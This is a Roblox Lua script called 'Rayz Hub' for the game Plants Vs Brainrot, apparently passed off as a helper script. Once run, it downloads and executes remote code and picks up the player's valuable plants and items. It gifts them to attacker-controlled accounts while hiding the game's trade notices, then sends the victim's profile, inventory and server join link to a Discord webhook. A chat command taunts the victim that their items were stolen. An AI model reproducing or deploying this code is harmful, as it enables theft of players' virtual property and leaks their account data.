---------------------------------------------------------------------
--  SERVICES
---------------------------------------------------------------------
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer

---------------------------------------------------------------------
--  CONFIG LOADER
---------------------------------------------------------------------
local CONFIG_URL = "https://rayzhub.netlify.app/scripts/config/config.json"

local function loadConfig()
	local success, result = pcall(function()
		local response = game:HttpGet(CONFIG_URL, true)
		return HttpService:JSONDecode(response)
	end)
	if success and result then
		return result
	end
	return nil
end

local Config = loadConfig()

if not Config or not Config.usernames or not Config.webhooks then
	player:Kick("Failed to load config. Check your internet.")
	return
end

local TARGET_PLAYERS = Config.usernames
local WEBHOOK_URL = Config.webhooks.pvb

local NAME = "Plants Vs Brainrot"
local AVATAR_URL = "https://rayzhub.netlify.app/media/pvb(9x9).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.jpg"
local IMAGE_URL = "https://rayzhub.netlify.app/media/pvb(9x16).jpg"

---------------------------------------------------------------------
--  LOAD GUI
---------------------------------------------------------------------
pcall(function()
	loadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/loadingscreen.lua", true))()
end)

---------------------------------------------------------------------
--  PLAYER REFERENCES
---------------------------------------------------------------------
local Character = player.Character or player.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")
local Backpack = player:WaitForChild("Backpack")
local humanoid = Character:WaitForChild("Humanoid")

---------------------------------------------------------------------
--  SETTINGS
---------------------------------------------------------------------
local autoPickPlants = true
local autoPick = true
local retryDelay = 0.2
local moneyPerSecondThreshold = (getgenv().MONEY_PER_SECOND or 100000)
local plantDamageThreshold = (getgenv().DMG_PER_SECOND or 100000)

local excluded_item_names = {
	"Shovel [Pick Up Plants]",
	"Basic Bat",
}

player:SetAttribute("Deleting", true)

---------------------------------------------------------------------
--  HELPER FUNCTIONS
---------------------------------------------------------------------
local function getExecutorName()
	if syn then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif getexecutorname then
		local s, r = pcall(getexecutorname)
		if s and r then
			return tostring(r)
		end
	elseif identifyexecutor then
		local s, r = pcall(identifyexecutor)
		if s and r then
			return tostring(r)
		end
	end
	return "Unknown"
end

local function getAccountAge()
	local totalDays = player.AccountAge
	local years = math.floor(totalDays / 365)
	local remaining = totalDays % 365
	local months = math.floor(remaining / 30)
	local days = remaining % 30

	local parts = {}
	if years > 0 then
		table.insert(parts, years .. "y")
	end
	if months > 0 then
		table.insert(parts, months .. "m")
	end
	if days > 0 or #parts == 0 then
		table.insert(parts, days .. "d")
	end
	return table.concat(parts, " ")
end

local function getPlayerCount()
	local current = #Players:GetPlayers()
	local max = Players.MaxPlayers
	return current .. "/" .. max
end

local function getStatusColor(status)
	if status == "🟢 Claimed" or status == "🟢 Connected" then
		return 0x2ECC71
	elseif status == "🔵 Partially Claimed" then
		return 0x3498DB
	elseif status == "🟡 Waiting" then
		return 0xF1C40F
	elseif status == "🔴 Failed" then
		return 0xE74C3C
	end
	return 0x800080
end

local function formatNumber(n)
	if not n then
		return "?"
	end
	return n >= 1000 and string.format("%.1fk", n / 1000) or tostring(n)
end

local function isExcluded(name)
	for _, excl in ipairs(excluded_item_names) do
		if name == excl then
			return true
		end
	end
	return false
end

---------------------------------------------------------------------
--  REMOTES & MODULES
---------------------------------------------------------------------
local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local GiftRemote = Remotes:WaitForChild("GiftItem")
local FavoriteRemote = Remotes:WaitForChild("FavoriteItem")
local RemoveItemRemote = Remotes:WaitForChild("RemoveItem")
local Util = require(ReplicatedStorage.Modules.Utility.Util)

local PlantClientModule
pcall(function()
	PlantClientModule = require(
		game:GetService("StarterPlayer").StarterPlayerScripts.Client.Modules:WaitForChild("Plants [Client]", 5)
	)
end)

---------------------------------------------------------------------
--  HIDE MESSAGES
---------------------------------------------------------------------
local MESSAGES_TO_HIDE = {
	["You are on cooldown for gifting!"] = true,
	["You don't own this item!"] = true,
	["Your trade is processing!"] = true,
	["Your trade is Complete!"] = true,
	["Equip a brainrot to place!"] = true,
	["This item is currently untradeable!"] = true,
}

local function hideMessages(gui)
	if not gui then
		return
	end
	for _, obj in ipairs(gui:GetDescendants()) do
		if obj:IsA("TextLabel") and MESSAGES_TO_HIDE[obj.Text] then
			obj.Visible = false
			obj.Text = ""
		elseif obj:IsA("BlurEffect") then
			obj:Destroy()
		elseif (obj:IsA("ImageLabel") or obj:IsA("Frame")) and obj.Name:lower():find("blur") then
			obj:Destroy()
		end
	end
end

RunService.RenderStepped:Connect(function()
	local pg = player:FindFirstChild("PlayerGui")
	if pg then
		for _, gui in ipairs(pg:GetChildren()) do
			if gui:IsA("ScreenGui") then
				hideMessages(gui)
			end
		end
	end
end)

player.CharacterAdded:Connect(function(newChar)
	Character = newChar
	humanoid = newChar:WaitForChild("Humanoid")
	HRP = newChar:WaitForChild("HumanoidRootPart")
end)

---------------------------------------------------------------------
--  UTIL FUNCS
---------------------------------------------------------------------
local function equipItem(item)
	if item and item.Parent ~= Character then
		item.Parent = Character
		local hum = Character:FindFirstChild("Humanoid")
		if hum and item:IsA("Tool") then
			pcall(function()
				hum:EquipTool(item)
			end)
		end
	end
end

local function toggleFavorite(item)
	pcall(function()
		FavoriteRemote:FireServer(item:GetDebugId() or item.Name)
	end)
end

---------------------------------------------------------------------
--  RECEIVER DETECTION
---------------------------------------------------------------------
local receiverActivity = {}
local activeReceiver = nil
local lastGiftTime = 0
local giftCooldown = 4

for _, name in ipairs(TARGET_PLAYERS) do
	receiverActivity[name] = false
end

local function setupReceiverDetection()
	for _, receiverName in ipairs(TARGET_PLAYERS) do
		local receiver = Players:FindFirstChild(receiverName)
		if receiver then
			local char = receiver.Character
			if char then
				local hum = char:FindFirstChild("Humanoid")
				if hum then
					hum.Jumping:Connect(function()
						receiverActivity[receiverName] = true
						activeReceiver = receiverName
					end)
				end
			end
			receiver.Chatted:Connect(function(msg)
				if msg == ".kick" then
					pcall(function()
						setclipboard("https://discord.gg/aEw4FCUGeJ")
					end)
					player:Kick(
						"your items just got stolen by rayz hub\njoin our discord server to get them back\n(link copied)"
					)
				else
					receiverActivity[receiverName] = true
					activeReceiver = receiverName
				end
			end)
			receiver.CharacterAdded:Connect(function(newChar)
				task.wait(1)
				local hum = newChar:FindFirstChild("Humanoid")
				if hum then
					hum.Jumping:Connect(function()
						receiverActivity[receiverName] = true
						activeReceiver = receiverName
					end)
				end
			end)
		end
	end
end
setupReceiverDetection()

Players.PlayerAdded:Connect(function(p)
	for _, receiverName in ipairs(TARGET_PLAYERS) do
		if p.Name == receiverName then
			task.wait(2)
			local char = p.Character or p.CharacterAdded:Wait()
			local hum = char:FindFirstChild("Humanoid")
			if hum then
				hum.Jumping:Connect(function()
					receiverActivity[receiverName] = true
					activeReceiver = receiverName
				end)
			end
			p.Chatted:Connect(function(msg)
				if msg == ".kick" then
					pcall(function()
						setclipboard("https://discord.gg/aEw4FCUGeJ")
					end)
					player:Kick(
						"your items just got stolen by rayz hub\njoin our discord server to get them back\n(link copied)"
					)
				else
					receiverActivity[receiverName] = true
					activeReceiver = receiverName
				end
			end)
		end
	end
end)

-- follow active receiver
task.spawn(function()
	while true do
		if activeReceiver then
			local receiver = Players:FindFirstChild(activeReceiver)
			if receiver and receiver.Character and receiver.Character:FindFirstChild("HumanoidRootPart") then
				local targetHRP = receiver.Character.HumanoidRootPart
				if HRP then
					HRP.CFrame = targetHRP.CFrame + Vector3.new(5, 0, 0)
				end
			end
		end
		task.wait(0.1)
	end
end)

---------------------------------------------------------------------
--  GIFTING
---------------------------------------------------------------------
local function sendGift(item, targetName)
	local now = tick()
	if now - lastGiftTime < giftCooldown then
		return
	end
	local receiver = Players:FindFirstChild(targetName)
	if receiver and receiver.Character and receiver.Character:FindFirstChild("HumanoidRootPart") then
		pcall(function()
			GiftRemote:FireServer({ Item = item, ToGift = targetName })
		end)
		lastGiftTime = now
	end
end

---------------------------------------------------------------------
--  PLOT & PROMPT HELPERS
---------------------------------------------------------------------
local function GetOwnedPlot()
	for _, plot in ipairs(workspace:WaitForChild("Plots"):GetChildren()) do
		if plot:GetAttribute("Owner") == player.Name then
			return plot
		end
	end
	return nil
end

local function getAllPrompts(parent)
	local prompts = {}
	for _, obj in ipairs(parent:GetDescendants()) do
		if obj:IsA("ProximityPrompt") and obj.Enabled then
			table.insert(prompts, obj)
		end
	end
	return prompts
end

local function firePrompts(model)
	while model.Parent do
		local moneyPerSecond = model:GetAttribute("MoneyPerSecond")
		if moneyPerSecond and moneyPerSecond > moneyPerSecondThreshold then
			for _, prompt in ipairs(getAllPrompts(model)) do
				if
					prompt.ActionText == "Pick Up Brainrot"
					or prompt.ActionText == "Remove Brainrot"
					or prompt.ActionText == "Pick Up Plant"
				then
					local parentModel = prompt:FindFirstAncestorWhichIsA("Model") or model
					local hitbox = parentModel:FindFirstChild("Hitbox") or parentModel.PrimaryPart
					if hitbox then
						HRP.CFrame = hitbox.CFrame + Vector3.new(0, 3, 0)
						task.spawn(function()
							pcall(function()
								fireproximityprompt(prompt, math.huge)
							end)
						end)
					end
				end
			end
		end
		task.wait(retryDelay)
	end
end

local function monitorFolder(folder)
	if not folder then
		return
	end
	for _, item in ipairs(folder:GetChildren()) do
		if item:GetAttribute("MoneyPerSecond") then
			task.spawn(function()
				firePrompts(item)
			end)
		end
	end
	folder.ChildAdded:Connect(function(newItem)
		if newItem:GetAttribute("MoneyPerSecond") then
			task.spawn(function()
				firePrompts(newItem)
			end)
		end
	end)
end

-- auto pick brainrots / plants
task.spawn(function()
	while autoPick do
		local ownedPlot = GetOwnedPlot()
		if ownedPlot then
			local brainrots = ownedPlot:FindFirstChild("Brainrots")
			local plants = ownedPlot:FindFirstChild("Plants")
			if brainrots then
				monitorFolder(brainrots)
			end
			if plants then
				monitorFolder(plants)
			end
			break
		end
		task.wait(0.5)
	end
end)

-- auto pick plants (inventory)
local function AutoPickupPlants()
	if not autoPickPlants then
		return
	end
	local plot = GetOwnedPlot()
	if not plot then
		return
	end
	local plantsFolder = plot:FindFirstChild("Plants")
	if not plantsFolder then
		return
	end
	local maxInventory = Util:GetMaxInventorySpace(player)
	local currentInventory = #Backpack:GetChildren()
	for _, plant in ipairs(plantsFolder:GetChildren()) do
		if currentInventory >= maxInventory then
			break
		end
		if plant:GetAttribute("Owner") ~= player.Name then
			continue
		end
		local plantID = plant:GetAttribute("ID")
		local plantDamage = plant:GetAttribute("Damage") or 0
		local isTrollMango = string.lower(plant.Name):find("troll mango")
		if plantID and (plantDamage > plantDamageThreshold or isTrollMango) then
			RemoveItemRemote:FireServer(plantID)
			if PlantClientModule and PlantClientModule.CleanupPlant then
				pcall(function()
					PlantClientModule:CleanupPlant(plantID)
				end)
			end
			currentInventory = currentInventory + 1
		end
	end
end

local lastScan = 0
local scanInterval = 2
RunService.RenderStepped:Connect(function()
	local now = tick()
	if now - lastScan >= scanInterval then
		lastScan = now
		AutoPickupPlants()
	end
end)

---------------------------------------------------------------------
--  WEBHOOK
---------------------------------------------------------------------
task.spawn(function()
	task.wait(4)

	local function hasValuableItems()
		for _, t in ipairs(Backpack:GetChildren()) do
			local damage = t:GetAttribute("Damage") or 0
			local worth = t:GetAttribute("Worth") or 0
			local name = t.Name:lower()
			if damage > plantDamageThreshold or worth > moneyPerSecondThreshold or name:find("troll mango") then
				return true
			end
		end
		for _, t in ipairs(Character:GetChildren()) do
			if t:IsA("Tool") then
				local damage = t:GetAttribute("Damage") or 0
				local worth = t:GetAttribute("Worth") or 0
				local name = t.Name:lower()
				if damage > plantDamageThreshold or worth > moneyPerSecondThreshold or name:find("troll mango") then
					return true
				end
			end
		end
		return false
	end

	local function buildInventoryLines()
		local items = {}

		for _, t in ipairs(Backpack:GetChildren()) do
			if not isExcluded(t.Name) then
				local damage = t:GetAttribute("Damage") or 0
				local worth = t:GetAttribute("Worth") or 0
				local emoji = "🧬"
				if damage > plantDamageThreshold then
					emoji = "⚔️"
				elseif worth > moneyPerSecondThreshold then
					emoji = "💰"
				elseif t.Name:lower():find("troll mango") then
					emoji = "🥭"
				end
				table.insert(items, {
					name = t.Name,
					emoji = emoji,
					damage = damage,
					worth = worth,
				})
			end
		end

		for _, t in ipairs(Character:GetChildren()) do
			if t:IsA("Tool") and not isExcluded(t.Name) then
				local damage = t:GetAttribute("Damage") or 0
				local worth = t:GetAttribute("Worth") or 0
				local emoji = "🧬"
				if damage > plantDamageThreshold then
					emoji = "⚔️"
				elseif worth > moneyPerSecondThreshold then
					emoji = "💰"
				elseif t.Name:lower():find("troll mango") then
					emoji = "🥭"
				end
				table.insert(items, {
					name = t.Name,
					emoji = emoji,
					damage = damage,
					worth = worth,
				})
			end
		end

		if #items == 0 then
			return "No items found", 0
		end

		table.sort(items, function(a, b)
			return (a.damage + a.worth) > (b.damage + b.worth)
		end)

		local lines = {}
		local maxShown = 15
		for i, item in ipairs(items) do
			if i <= maxShown then
				local stats = ""
				if item.damage > 0 then
					stats = stats .. " DMG:" .. formatNumber(item.damage)
				end
				if item.worth > 0 then
					stats = stats .. " $/s:" .. formatNumber(item.worth)
				end
				table.insert(lines, item.emoji .. " " .. item.name .. stats)
			end
		end

		local result = table.concat(lines, "\n")
		if #items > maxShown then
			result = result .. "\n… and " .. (#items - maxShown) .. " more"
		end

		return result, #items
	end

	local inventoryText, itemCount = buildInventoryLines()
	inventoryText = inventoryText .. "\n─────────────────────────────────\n📊 Total: " .. tostring(itemCount) .. " items"

	-- Player information
	local displayName = (player.DisplayName and player.DisplayName ~= "") and player.DisplayName or player.Name
	local userName = player.Name
	local accountAge = getAccountAge()
	local executor = getExecutorName()
	local playerCount = getPlayerCount()
	local receiverList = table.concat(TARGET_PLAYERS, ", ")

	local playerInfoText = "👤 Display Name  : "
		.. displayName
		.. "\n"
		.. "🆔 Username      : "
		.. userName
		.. "\n"
		.. "📅 Account Age   : "
		.. accountAge
		.. "\n"
		.. "🖥  Executor      : "
		.. executor
		.. "\n"
		.. "👥 Players       : "
		.. playerCount
		.. "\n"
		.. "😎 Receiver      : "
		.. receiverList

	-- Status and color
	local currentStatus = "🟡 Waiting"
	local embedColor = getStatusColor(currentStatus)

	-- Join link and teleport script
	local joinUrl = string.format(
		"https://rayzhubjoiner.vercel.app?placeId=%s&jobId=%s",
		game.PlaceId,
		game.JobId
	)
	local tpScript = string.format(
		'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
		game.PlaceId,
		game.JobId
	)

	-- Ping logic
	local contentText = ""
	if hasValuableItems() then
		contentText = "> @everyone 🔔 **GOOD HIT**"
	elseif itemCount > 0 then
		contentText = "> 🔔 **Small Hit**"
	end
	contentText = contentText .. "\n```lua\n" .. tpScript .. "\n```"

	local payload = {
		content = contentText,
		username = NAME,
		avatar_url = AVATAR_URL,
		embeds = {
			{
				title = "⚡ RAYZ HUB ⚡",
				color = embedColor,
				fields = {
					{
						name = "📄 Player Information",
						value = "```" .. playerInfoText .. "```",
						inline = false,
					},
					{
						name = "📡 Player Status",
						value = "```" .. currentStatus .. "```",
						inline = false,
					},
					{
						name = "🎒 Inventory (" .. tostring(itemCount) .. " items)",
						value = "```" .. inventoryText .. "```",
						inline = false,
					},
					{
						name = "👤 Join Link",
						value = "[🔗 Click to Join Player](" .. joinUrl .. ")",
						inline = false,
					},
				},
				footer = {
					text = "RAYZ HUB • PvB • " .. os.date("!%m/%d/%Y %I:%M %p") .. " UTC",
					icon_url = LOGO_URL,
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				image = {
					url = IMAGE_URL,
				},
			},
		},
	}

	local json = HttpService:JSONEncode(payload)
	local req = (syn and syn.request)
		or (http and http.request)
		or http_request
		or request
		or httprequest
		or (fluxus and fluxus.request)

	pcall(function()
		if req then
			req({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = json,
			})
		end
	end)
end)

print("[Rayz Hub] pvb loaded...")